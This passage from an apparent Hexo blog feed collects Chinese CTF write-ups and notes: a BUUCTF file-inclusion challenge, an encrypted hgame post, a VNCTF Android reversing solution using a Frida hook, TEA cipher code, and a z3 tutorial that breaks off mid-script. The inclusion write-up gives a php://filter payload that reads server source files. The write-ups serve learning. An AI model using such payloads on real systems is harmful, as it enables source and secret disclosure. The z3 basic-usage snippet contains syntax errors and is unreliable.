        <content type="html"><![CDATA[<h2 id="buuctf-ACTF2020-新生赛-Include"><a href="#buuctf-ACTF2020-新生赛-Include" class="headerlink" title="buuctf[ACTF2020 新生赛]Include"></a>buuctf[ACTF2020 新生赛]Include</h2><p>打开靶机看到页面只有一个tips</p><p><img src="/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/1.png" alt="1"></p><p>点击一下</p><p><img src="/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/2.png" alt="2"></p><p>看源码什么也没有，结合题目include猜测是文件包含</p><p>来个链接学一下 <a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p><p>我们可以用php伪协议，再来个链接 <a href="https://blog.csdn.net/cosmoslin/article/details/120695429">https://blog.csdn.net/cosmoslin/article/details/120695429</a></p><p>我们可以用php:&#x2F;&#x2F;filiter读取源码</p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/3.png" alt="3"></p><p>base64解密以下得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">好久没学新东西了，突然发现web的入门题还是很好玩的。脑子有点混乱了，还有很多东西要学啊，没关系，</span><br><span class="line">今天又进步了一点😊</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 签到 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2025</title>
      <link href="/2025/02/19/hgame2025/"/>
      <url>/2025/02/19/hgame2025/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3c1164c5bbf0bee5da36f588dbe81ea65f7a1c1d1456497bb0449c7d1d9fc39c">62e1f3225d430feeb56f91434d2e165c6a6a4cca9b0fe96b9e668ac09f30dac84a09926897b767a3cdc49b3327c4e4e9d7cf0e97628d05720464340ea5e8e27b8e11d5edb9641d8cc6370a83a4236751e4fd5c3b3469f82f18b364748de83256262786d898fd6a7240d3581f96f61f72e4d165ede7941960a678f6e93dc29218e7962bbed27ffcd9419d68c6023565daa9fb427ad1e685ec503ce7d5b7cb36b231fffdc7a3ab992b36c4369eb97ed3c072ff07210691d83edb5da54c07e6978b93c25665f707f9ebf833c429cd27b17ac48ecd6765a533fde670fc4e373ce8dd0247542c5bcc213a0638f3ab0923a3bad221f5ebeb5f7568c374d00f9ab337c9241b6b262156e52c433019e2e7d50dfeedc88edd7e424b1dc018698a15960f805313d465b62e08fbdc9af8179c7274e1d296df18107e44714df6085ef449854c1393f566796172e7318b213c731fbc964dbf501c4efa49cae0450cae463f30b0308f4a0059db4a3eec07dff47250c743685c495b53c4909a96c9683c9b6abdd375bab71c314feb1e749064edcc5e12441cbfa6b80539071f8ce3484415283ab81b42af35c95dafd25edc993a4a250513d23e4cc5f94b651f569ad0ffae6c8043657ef0e5393e729f17c40398f26eaf75ef7480a6f500fd980f36289c04ff3aa0f56b9fdbcd0a14bbf660b1fdfe8e050f3d691b934a01997d92c5ebd419781d0d49ca916b0ddac10bdb8f72de82abb02f5dffac1a075351facb8f4792b4e25238025ee7c0c49f76ad1be80f5bf345f1532c84bc7226fedf6944d353e972ed3899dba5f1f41d680072a49ece91fcea1d4af85f53fb7c67462f7149fab93c8753ed5dc76eb635a8f069b30562b9881f918f965c70d17636feb81adc96294e7576181d99efc1fd892443069eb029407b1176e3ab2da1f6129c38280adcbe33cdaec1e41a5f04030f29e309fc7e1ebb8a75f95f3fda79589565baeb649ea98bce677f326c8db58f13d5fd0023a6c6386f8876878132990205a4876a574121ba33b5ebb8096a7d9cff95f8f22f36d96599f17d363291d2841a1bfc2c5de6b88953f2b13d2915ac1bb43ea450a1edaeb8782efc740d759aff2c57c3fc5df3130e597f8f447e1727b83c98e9e702758ff59bf1a73fc508855b5bb221e1ee9d381867760bfd0e2bb22395002e64f17c696120121b94aadde1c401bd2220295799afbf0b0a3d754a625878887faf0b0a67b9fb7c82fadd7c752b119962cd6db747c9e21a3bb1db7492861e6ba3683a8c0c09595ab4a449025b8c67002681f8451217cc4dfe99e69bd364e5d53112cf69485c7c7f8f39e8c1e18545ea5c985e54611c9ed7ddad1b42c1ec3b68c66ae0d13d64cdd300b9173a1ee129137c53e4ac66d724c7a0bb63cffc96dfb4efa711fddc623fa63f81b6de0a7cf3b1a143cd2d18e354c3fbe99370f9920e27d8995284829458b7b406e6c4081789bfe5e70c03992885c356396b23974ef0eb84bb7ef00a12dde8a0becf1c537822a9dd193a492aa321ffc3cfc98fcd12012dd000473f5de02bab5782c182abfd4a08475f9c735f173a79f4dcfc8d7dddfbc90adcc944cdfaf7166c60fb8e73ee54e5bdca6c124a1b082583</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-re</title>
      <link href="/2025/02/16/VNCTF-re/"/>
      <url>/2025/02/16/VNCTF-re/</url>
      
        <content type="html"><![CDATA[<p>😫今天终于想起来复现了，这次比赛没做出来一道题，好惨</p><h2 id="hook-fish"><a href="#hook-fish" class="headerlink" title="hook_fish"></a>hook_fish</h2><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p><img src="/2025/02/16/VNCTF-re/1.png" alt="timu"></p><p>总之就是输入flag验证是否正确</p><p>先找到主函数</p><p><img src="/2025/02/16/VNCTF-re/2.png" alt="main"></p><p>check验证函数应该在hook_fish.dex中，根据fish函数的参数hookfish找到下载链接</p><p><img src="/2025/02/16/VNCTF-re/3.png" alt="down"></p><p>输入的flag先经过本地encrypt函数加密，再经过hook_fish.dex中的check方法进行混淆</p><h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p><img src="/2025/02/16/VNCTF-re/4.png" alt="jiemi"></p><p>check方法用哈希映射加密，在mainactivity中保留了decode方法，可以用hook方法解密</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MainActivity</span> = </span><br><span class="line">   <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.hihitt.MainActivity&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;找到类: com.example.hihitt.MainActivity&quot;</span>);</span><br><span class="line">    <span class="comment">//hook 掉删除的方法，并直接在此方法中进行解密</span></span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">fish_fade</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;阻止删除了文件&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> result = </span><br><span class="line">   <span class="variable language_">this</span>.<span class="title function_">decode</span>(<span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;解密结果: &quot;</span> + result);</span><br><span class="line">    &#125;;</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure><p>得到解密结果: 0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5</p><p>然后逆向解密</p><p><img src="/2025/02/16/VNCTF-re/5.png" alt="jiemi"></p><p>code函数的作用就是每两个字节之间交换顺序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">char</span> encode[<span class="number">73</span>] = </span><br><span class="line"><span class="string">&quot;0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5&quot;</span>;</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;<span class="number">72</span>;i++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(encode[i] &gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; encode[i]&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line"> encode[i]= (encode[i]-(i%<span class="number">4</span>))+<span class="number">49</span>;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> encode[i]= (encode[i]-(i%<span class="number">10</span>))- <span class="number">55</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">72</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line"> <span class="type">char</span> tmp = encode[i];</span><br><span class="line"> encode[i]=encode[i+<span class="number">1</span>];</span><br><span class="line"> encode[i+<span class="number">1</span>]=tmp;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">72</span>;i++)&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,encode[i]);</span><br><span class="line"> &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//结果为9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/16/VNCTF-re/6.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TEA</title>
      <link href="/2025/02/10/TEA/"/>
      <url>/2025/02/10/TEA/</url>
      
        <content type="html"><![CDATA[<h2 id="TEA原理"><a href="#TEA原理" class="headerlink" title="TEA原理"></a>TEA原理</h2><p>TEA是一种分组加密算法，使用64位的密文分组和128位的密钥，它使用Feistel分组加密框架，需要进行 <strong>64</strong> 轮迭代，尽管作者认为 <strong>32</strong> 轮已经足够了。该算法使用delta作为倍数，以保证每一轮加密都不相同，TEA中定义为0x9e3779b9</p><p><img src="/2025/02/10/TEA/1.png" alt="tea"></p><p>加密函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Encrypt</span><span class="params">(<span class="type">long</span>* EntryData, <span class="type">long</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="comment">//总共加密32轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">long</span>* EntryData, <span class="type">long</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    sum = delta &lt;&lt; <span class="number">5</span>;   <span class="comment">//注意这里,sum = 32轮之后的黄金分割值. 因为我们要反序解密.</span></span><br><span class="line">    <span class="comment">//总共加密32轮 那么反序也解密32轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 先将y解开 然后参与运算在解x</span></span><br><span class="line">        y -= ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">        x -= ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TEA逆向"><a href="#TEA逆向" class="headerlink" title="TEA逆向"></a>TEA逆向</h2><p>tea的特征为delta和16字节的密钥，有些魔改的tea会改变delta的值</p><h2 id="XTEA原理"><a href="#XTEA原理" class="headerlink" title="XTEA原理"></a>XTEA原理</h2><p>TEA 算法被发现存在缺陷，作为回应，设计者提出了一个 TEA 的升级版本——XTEA（有时也被称为”tean”）。XTEA 跟 TEA 使用了相同的简单运算，但它采用了截然不同的顺序，为了阻止密钥表攻击，四个子密钥（在加密过程中，原 128 位的密钥被拆分为 4 个 32 位的子密钥）采用了一种不太正规的方式进行混合，但速度更慢了。</p><h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p>XXTEA是一个非平衡Feistel网络分组密码，在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥, 是目前TEA系列中最安全的算法，但性能较上两种有所降低。</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的z3</title>
      <link href="/2025/02/10/%E7%AE%80%E5%8D%95%E7%9A%84z3/"/>
      <url>/2025/02/10/%E7%AE%80%E5%8D%95%E7%9A%84z3/</url>
      
        <content type="html"><![CDATA[<h2 id="z3-solver求解器"><a href="#z3-solver求解器" class="headerlink" title="z3-solver求解器"></a>z3-solver求解器</h2><p>z3-solver是由Microsoft Research(微软)开发的SMT求解器，它用于检查逻辑表达式的可满足性，可以找到一组约束中的其中一个可行解，缺点是无法找出所有的可行解</p><p>pip安装：<code>pip install z3-solver</code></p><p>基本用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line">x.Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y.Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">s=z3.Solver()</span><br><span class="line">s.add(x+y=<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == z3.sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;NO SOLUTION!&quot;</span>)</span><br></pre></td></tr></table></figure><p>实数：<code>y = z3.Real(name = &#39;y&#39;)</code></p><p>位向量：<code>z = z3.BitVec(name = &#39;z&#39;, bv = 32)</code></p><p>布尔：<code>p = z3.Bool(name = &#39;p&#39;)</code></p><p>对于布尔类型的式子而言，我们可以使用 <code>z3</code> 内置的 <code>And()</code>、<code>Or()</code>、<code>Not()</code>、<code>Implies()</code> 等方法进行布尔逻辑运算</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[NSSRound#X Basic]ez_z3</p><p>第一步查壳，是64位，UPX的魔改壳，把XYU改成UPX后直接脱壳</p><p>第二步放入ida找到关键代码</p><p><img src="/2025/02/10/%E7%AE%80%E5%8D%95%E7%9A%84z3/1.png" alt="daima"></p><p>sub_14001124E函数是快速幂的变体，</p><p>sub_14001103C里面一堆方程，用z3求解，但是ida代码中方程直接的逻辑关系是||，但是只有全部满足才能做出来，有点奇怪</p><p>sub_1400112F8是异或，最后判断是否相等</p><p>exp:</p><p>求z3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s=Solver()</span><br><span class="line">a0,a1,a2,a3,a4,a5,a6,a7,a8,a9 = BitVecs(<span class="string">&quot;a0 a1 a2 a3 a4 a5 a6 a7 a8 a9&quot;</span>,<span class="number">12</span>)</span><br><span class="line">a10,a11,a12,a13,a14,a15,a16,a17,a18,a19 = BitVecs(<span class="string">&quot;a10 a11 a12 a13 a14 a15 a16 a17 a18 a19&quot;</span>,<span class="number">12</span>)</span><br><span class="line">s.add(<span class="number">2582239</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> - a2*<span class="number">3</span> - a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> + a9*<span class="number">10</span></span><br><span class="line">* a10*<span class="number">11</span> - a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> * a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">2602741</span> == a0*<span class="number">1</span> * a1*<span class="number">2</span> + a2*<span class="number">3</span> - a3*<span class="number">4</span> + a4*<span class="number">5</span> + (a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span>) + a9*<span class="number">10</span></span><br><span class="line">* a10*<span class="number">11</span> - a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> - (a16*<span class="number">17</span> + a17*<span class="number">18</span>) + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">2668123</span> == a0*<span class="number">1</span> - a1*<span class="number">2</span> - a2*<span class="number">3</span> * a3*<span class="number">4</span> - a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span> + a8*<span class="number">9</span> - a9*<span class="number">10</span></span><br><span class="line">+ a10*<span class="number">11</span> * a11*<span class="number">12</span> + a12*<span class="number">13</span> * a13*<span class="number">14</span> - a14*<span class="number">15</span> - a15*<span class="number">16</span> * a16*<span class="number">17</span> + a17*<span class="number">18</span> + a18*<span class="number">19</span> -</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">2520193</span> == (a0*<span class="number">1</span> + a1*<span class="number">2</span> - a2*<span class="number">3</span> - a3*<span class="number">4</span> + a4*<span class="number">5</span>) + a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> + a9*<span class="number">10</span></span><br><span class="line">* (a10*<span class="number">11</span> - a11*<span class="number">12</span> + a12*<span class="number">13</span>) + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">8904587</span> == a0*<span class="number">1</span> * a1*<span class="number">2</span> * a2*<span class="number">3</span> - a3*<span class="number">4</span> - a4*<span class="number">5</span> - a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> * a8*<span class="number">9</span> + a9*<span class="number">10</span> -</span><br><span class="line">a10*<span class="number">11</span> + a11*<span class="number">12</span> * a12*<span class="number">13</span> - a13*<span class="number">14</span> + a14*<span class="number">15</span> - a15*<span class="number">16</span> + a16*<span class="number">17</span> + a17*<span class="number">18</span> - a18*<span class="number">19</span> - a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">1227620874</span> == a0*<span class="number">1</span> - a1*<span class="number">2</span> - a2*<span class="number">3</span> + (a3*<span class="number">4</span> + a4*<span class="number">5</span> * a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span>) - a8*<span class="number">9</span> -</span><br><span class="line">a9*<span class="number">10</span> * a10*<span class="number">11</span> - (a11*<span class="number">12</span> + a12*<span class="number">13</span> - a13*<span class="number">14</span> - a14*<span class="number">15</span>) * a15*<span class="number">16</span> - a16*<span class="number">17</span> + a17*<span class="number">18</span> - a18*<span class="number">19</span></span><br><span class="line">- a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">1836606059</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> + a2*<span class="number">3</span> + a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> +</span><br><span class="line">a9*<span class="number">10</span> * a10*<span class="number">11</span> * a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * a15*<span class="number">16</span> + a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span></span><br><span class="line">* a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">8720560</span> == a0*<span class="number">1</span> * a1*<span class="number">2</span> - a2*<span class="number">3</span> + a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> * a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> - a9*<span class="number">10</span></span><br><span class="line">- a10*<span class="number">11</span> + a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> + a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> *</span><br><span class="line">a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">11387045</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> - a2*<span class="number">3</span> + (a3*<span class="number">4</span> + a4*<span class="number">5</span> + a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> +</span><br><span class="line">a9*<span class="number">10</span>) * a10*<span class="number">11</span> - a11*<span class="number">12</span> + a12*<span class="number">13</span> + a13*<span class="number">14</span> - a14*<span class="number">15</span> * (a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span>) + a18*<span class="number">19</span></span><br><span class="line">* a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">7660269</span> == a0*<span class="number">1</span> - a1*<span class="number">2</span> + a2*<span class="number">3</span> + a3*<span class="number">4</span> - a4*<span class="number">5</span> - a5*<span class="number">6</span>*<span class="number">5</span> - a6*<span class="number">7</span> + a7*<span class="number">8</span> + a8*<span class="number">9</span> + a9*<span class="number">10</span></span><br><span class="line">* a10*<span class="number">11</span> - a11*<span class="number">12</span> - a12*<span class="number">13</span> + a13*<span class="number">14</span> + a14*<span class="number">15</span> * a15*<span class="number">16</span> - a16*<span class="number">17</span> - a17*<span class="number">18</span> + a18*<span class="number">19</span> * a19*<span class="number">20</span>)</span><br><span class="line">s.add(<span class="number">2461883</span> == a0*<span class="number">1</span> + a1*<span class="number">2</span> - (a2*<span class="number">3</span> * a3*<span class="number">4</span> - a4*<span class="number">5</span> - a5*<span class="number">6</span>*<span class="number">5</span>) - a6*<span class="number">7</span> + a7*<span class="number">8</span> - a8*<span class="number">9</span> + (a9*<span class="number">10</span></span><br><span 